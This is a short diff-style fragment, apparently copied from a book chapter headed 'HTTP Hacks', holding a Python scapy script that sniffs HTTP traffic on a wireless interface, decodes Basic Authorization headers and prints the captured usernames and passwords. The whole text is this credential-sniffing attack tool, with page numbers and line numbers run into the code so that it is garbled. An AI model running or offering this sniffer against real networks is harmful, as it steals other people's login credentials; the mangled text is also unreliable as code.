@@ -1,0 +1,3 @@
+ #!/usr/bin/python 2 3 import re
+92 7 HTTP Hacks
+4 from base64 import b64decode 5 from scapy.all import sniff 6 7 dev = "wlan0" 8 9 def handle_packet(packet): 10 tcp = packet.getlayer("TCP") 11 match = re.search(r"Authorization: Basic (.+)", 12 str(tcp.payload)) 13 14 if match: 15 auth_str = b64decode(match.group(1)) 16 auth = auth_str.split(":") 17 print "User: " + auth[0] + " Pass: " + auth[1] 18 19 sniff(iface=dev, 20 store=0, 21 filter="tcp and port 80", 22 prn=handle_packet)
